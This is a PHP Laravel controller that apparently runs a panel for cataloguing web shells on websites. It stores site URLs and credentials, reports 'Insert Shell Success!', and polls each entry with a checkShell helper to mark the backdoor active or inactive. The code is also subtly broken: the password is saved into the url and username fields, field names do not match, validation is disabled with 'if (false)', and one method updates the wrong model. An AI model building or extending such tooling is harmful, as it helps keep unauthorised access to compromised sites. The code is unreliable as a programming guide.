<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Crypt;
use Helper;

class websiteController extends Controller
{
    public function websiteindex(Request $request) {
        if (!empty($request->input('keyword'))) {
            $data = \App\Models\Website::where('url', 'like', "%".$request->input('keyword')."%")
            ->orWhere('username', 'like', "%".$request->input('keyword')."%")
            ->orWhere('commentaire', 'like', "%".$request->input('keyword')."%")
            ->paginate(1000);

            return view('website.website', [
                'data' => $data
            ]);

        } else {
            $data = \App\Models\Website::orderBy('id', 'DESC')->paginate(10);
            if (count($data) > 0) {

                return view('website.website', [
                    'data' => $data
                ]);

            } else {

                return redirect('/website/new');
            }
        }
    }

    public function websiteview($id) {
        $data = \App\Models\Website::where('id', Crypt::decryptString($id))->first();
        return view('website.website_detail', [
            'data' => $data
        ]);
    }

    public function websiteinput() {
        return view('website.website_input');
    }

    public function websitesource() {
        return view('website.website_source');
    }

    public function websiteinputpost(Request $request) {
        //make validation

        if (false) {
            return redirect('/website')->with(['alert' => 'Error!']);
        } else {
            $act = \App\Models\Website::insert([
                'url' => $request->password,
                'username' =>$request->password,
                'password' => bcrypt($request->password),
                'comment' =>$request->comment,
                'created_at' => date('Y-m-d H:i:s'),
                'updated_at' => date('Y-m-d H:i:s'),
            ]);
            if ($act) {
                return redirect('/website')->with(['alert' => 'Insert Shell Success!']);
            } else {
                return redirect('/website')->with(['alert' => 'Error!']);
            }
        }
    }

    public function websiteupdate(Request $request) {
        $url = \App\Models\Website::select('url')->where('id', Crypt::decryptString($request->id))->first();
        $cek = Helper::checkShell($url->url);
        if ($cek == false) {
            \App\Models\Website::where('url', $url->url)->update([
                'status' => 'inactive',
                'updated_at' => date('Y-m-d H:i:s'),
            ]);
            return redirect()->back()->with(['alert' => 'Recheck Website Success!']);
        } else {
            \App\Models\Website::where('url', $url->url)->update([
                'status' => 'active',
                'updated_at' => date('Y-m-d H:i:s'),
            ]);
            return redirect()->back()->with(['alert' => 'Recheck Website Success!']);
        }
    }

    public function websitedelete(Request $request) {
        $act = \App\Models\Website::where('id', Crypt::decryptString($request->id))->delete();
        if ($act) {
            return redirect('/website')->with(['alert' => 'Delete Website Success!']);
        } else {
            return redirect('/website')->with(['alert' => 'Error!']);
        }
    }

    public function websitecheckjq(Request $request) {
        $url = \App\Models\Website::select('url', 'domain')->where('id', $request->id)->first();
        $cek = Helper::checkShell($url->url);

        if ($cek == false) {
            \App\Models\Shell::where('url', $url->url)->update([
                'status' => 'inactive',
                'updated_at' => date('Y-m-d H:i:s'),
            ]);
            print_r('Inactive');
        } else {
            \App\Models\Shell::where('url', $url->url)->update([
                'status' => 'active',
                'updated_at' => date('Y-m-d H:i:s'),
            ]);
            print_r('Active');
        }
    }
}
